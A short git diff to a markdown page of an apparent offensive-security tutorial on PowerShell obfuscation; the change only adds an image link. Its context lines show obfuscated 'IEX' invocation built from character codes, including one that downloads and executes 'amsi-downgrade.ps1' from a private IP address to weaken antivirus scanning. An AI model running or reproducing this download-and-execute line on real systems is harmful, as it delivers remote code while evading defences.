@@ -1095,6 +1095,8 @@ Concatenated IEX API call
     &(''.SubString.ToString()[67,72,64]-Join'')'Get-Service' # IEX 'Get-Service'
     &(''.SubString.ToString()[67,72,64]-Join'') (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
 
+![oki](https://user-images.githubusercontent.com/23490060/153917220-2a276c5a-7f47-4abc-9fe6-86c01c7969c0.png)
+
 ---
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
